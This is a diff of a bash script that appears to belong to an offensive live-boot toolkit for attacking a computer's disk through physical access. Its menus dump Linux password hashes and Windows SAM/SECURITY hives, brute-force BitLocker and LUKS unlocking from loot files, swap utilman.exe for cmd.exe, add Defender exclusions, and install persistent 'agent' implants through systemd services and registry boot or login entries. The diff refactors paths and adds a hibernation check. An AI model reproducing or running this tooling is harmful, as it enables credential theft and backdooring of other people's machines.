@@ -34,10 +34,6 @@ function banner() {
 	echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
 	echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
 }
-function leaver() {
-    umount /mnt
-    exit 0
-}
 
 function linux_hashcat_exp() {
     systemctl stop p3ng0s-cracker-watcher.path
@@ -52,22 +48,24 @@ function linux_hashcat_exp() {
 }
 
 function linux_systemd_infect_exp() {
-    [ ! -d /mnt/usr/local/bin ] && mkdir -p /mnt/usr/local/bin
-    [ ! -d /mnt/etc/systemd/system/multi-user.target.wants ] && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants/
-    cp -r /home/p4p1-live/loot/agent.elf /mnt/usr/local/bin/agent
-    chmod +x /mnt/usr/local/bin/agent
-    cp -r /etc/p3ng0s/os_killer/infect.service /mnt/etc/systemd/system/infect.service
-    ln -sf /etc/systemd/system/infect.service /mnt/etc/systemd/system/multi-user.target.wants/infect.service
+    if [ -f $LOOT_FOLDER/agent.elf ]; then
+        [ ! -d /mnt/usr/local/bin ] && mkdir -p /mnt/usr/local/bin
+        [ ! -d /mnt/etc/systemd/system/multi-user.target.wants ] && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants/
+        cp -r $LOOT_FOLDER/agent.elf /mnt/usr/local/bin/agent
+        chmod +x /mnt/usr/local/bin/agent
+        cp -r /etc/p3ng0s/os_killer/infect.service /mnt/etc/systemd/system/infect.service
+        ln -sf /etc/systemd/system/infect.service /mnt/etc/systemd/system/multi-user.target.wants/infect.service
+    fi
 }
 
 function linux_exp() {
     while true; do
         SEL=$(dialog --title "What are you looking for?" \
             --menu "...." 20 70 15 \
-            1 "dump passwd & shadow" \
-            2 "chroot :)" \
-            3 "Dump the hashes to then hashcat them ^^" \
-            4 "Systemd infect" \
+            1 "r: dump passwd & shadow" \
+            2 "w: chroot :)" \
+            3 "r: Dump the hashes to then hashcat them ^^" \
+            4 "w: Systemd infection (requires: loot/agent.elf)" \
             2>&1 >/dev/tty)
         EXIT_STATUS=$?
 
@@ -98,36 +96,32 @@ function windows_exclusion_path_exp() {
 }
 
 function windows_user_login_exp() {
-    if [ ! -f /home/p4p1-live/loot/agent.exe ]; then
-        echo -e "\e[1;31m[!]\e[m No agent.exe found at /home/p4p1-live/loot/agent.exe! Cannot proceed"
-        return 1
+    if [ -f $LOOT_FOLDER/agent.exe ]; then
+        [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
+        cp $LOOT_FOLDER/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
+        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SOFTWARE' "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/exe_on_user_login.reg
     fi
-    [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
-    cp /home/p4p1-live/loot/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
-    hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SOFTWARE' "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/exe_on_user_login.reg
 }
 
 function windows_boot_service_exp() {
-    if [ ! -f /home/p4p1-live/loot/agent.svc.exe ]; then
-        echo -e "\e[1;31m[!]\e[m No agent.svc.exe found at /home/p4p1-live/loot/agent.svc.exe! Cannot proceed"
-        return 1
+    if [ -f $LOOT_FOLDER/agent.svc.exe ]; then
+        [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
+        cp $LOOT_FOLDER/agent.svc.exe /mnt/Windows/Tasks/p3ng0s/agent.svc.exe
+        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SYSTEM' "/mnt/Windows/System32/config/SYSTEM" /etc/p3ng0s/os_killer/service_start_on_boot.reg
     fi
-    [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
-    cp /home/p4p1-live/loot/agent.svc.exe /mnt/Windows/Tasks/p3ng0s/agent.svc.exe
-    hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SYSTEM' "/mnt/Windows/System32/config/SYSTEM" /etc/p3ng0s/os_killer/service_start_on_boot.reg
 }
 
 function windows_exp() {
     while true; do
         SEL=$(dialog --title "What are you looking for?" \
             --menu "...." 20 70 15 \
-            1 "Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
-            2 "Swap cmd.exe and utilman.exe" \
-            3 "Secrets dump me baby right now" \
-            4 "Dump the hashes to then hashcat them ^^" \
-            5 "Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
-            6 "Install agent.exe to run on user login" \
-            7 "Install agent.svc.exe to run on boot as NT Authority/System" \
+            1 "r: Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
+            2 "w: Swap cmd.exe and utilman.exe" \
+            3 "r: Secrets dump me baby right now" \
+            4 "r: Dump the hashes to then hashcat them ^^" \
+            5 "rw: Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
+            6 "rw: Infect on user login (requires: loot/agent.exe)" \
+            7 "rw: Infect on boot as NT Authority/System (requires: loot/agent.svc.exe)" \
             2>&1 >/dev/tty)
         EXIT_STATUS=$?
 
@@ -150,15 +144,42 @@ function windows_exp() {
 }
 
 function select_os() {
-    mount $PART /mnt
     [ $? -ne 0 ] && $(sleep 4;exit -1)
     OS_SEL=$(dialog --title "Select a operating system" \
         --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
         1 "Windows" \
         2 "Linux" \
         2>&1 >/dev/tty)
-    [ $OS_SEL = 1 ] && windows_exp
-    [ $OS_SEL = 2 ] && linux_exp
+    if [ $OS_SEL = 1 ]; then
+        hybernation_check
+        windows_exp
+    elif [ $OS_SEL = 2 ]; then
+        mount $PART /mnt
+        linux_exp
+    fi
+}
+
+function hybernation_check() {
+    mkdir -p /mnt/ntfs_test
+    echo "[!] Please wait for the hibernation checks...."
+    MOUNT_TEST=$(mount -t ntfs-3g "$PART" /mnt/ntfs_test 2>&1)
+    umount /mnt/ntfs_test 2>/dev/null
+    rmdir /mnt/ntfs_test 2>/dev/null
+
+    if echo "$MOUNT_TEST" | grep -qi "hibernated"; then
+        SEL=$(dialog --title "Hibernation Detected!" \
+            --menu "\nWindows is hibernated on $PART.\nWhat do you want to do?" 15 60 3 \
+            1 "Mount Read-Only (safe, limited attacks)" \
+            2 "Remove hibernation file (recommended)" \
+            3 "Nuclear do not use this option!" \
+            2>&1 >/dev/tty)
+
+        [ $SEL = 1 ] && mount -t ntfs-3g -o ro "$PART" /mnt
+        [ $SEL = 2 ] && $(ntfsfix -d "$PART" && mount -o remove_hiberfile "$PART" /mnt)
+        [ $SEL = 3 ] && mount -t ntfs-3g -o remove_hiberfile=no "$PART" /mnt
+    else
+        mount $PART /mnt
+    fi
 }
 
 function encryption_check() {
@@ -166,7 +187,6 @@ function encryption_check() {
     TYPE=$(blkid -s TYPE -o value $DEV)
     if [[ "$TYPE" == "BitLocker" ]]; then
         echo "[!] BitLocker detected on $DEV"
-        # Try keys from file first
         if [[ -f "/home/p4p1-live/loot/bitlocker.txt" ]]; then
             while IFS= read -r key || [[ -n "$key" ]]; do
                 [[ -z "$key" || "$key" =~ ^# ]] && continue
@@ -181,7 +201,6 @@ function encryption_check() {
                 fi
             done < /home/p4p1-live/loot/bitlocker.txt
         fi
-        # Prompt if file keys fail
         echo "[-] Recovery keys from file failed or not found."
         read -s -p "Enter BitLocker Recovery Key or Password: " user_pass
         echo
@@ -198,7 +217,6 @@ function encryption_check() {
         fi
     elif [[ "$TYPE" == "crypto_LUKS" ]]; then
         echo "[!] Crypto LUKS detected on $DEV"
-        # Try passwords from file
         if [[ -f "/home/p4p1-live/loot/luks.txt" ]]; then
             while IFS= read -r pass || [[ -n "$pass" ]]; do
                 [[ -z "$pass" || "$pass" =~ ^# ]] && continue
@@ -212,7 +230,6 @@ function encryption_check() {
             done < /home/p4p1-live/loot/luks.txt
         fi
 
-        # Prompt if file passwords fail
         echo "[-] LUKS passwords from file failed."
         read -s -p "Enter LUKS Passphrase: " user_pass
         echo
@@ -257,6 +274,7 @@ else
 fi
 
 umount /mnt
+cryptsetup close unlock
 echo -e "\e[1;32m[*]\e[m you will now be booting in the gui environement if run at startup ^^"
 sleep 5
 exit
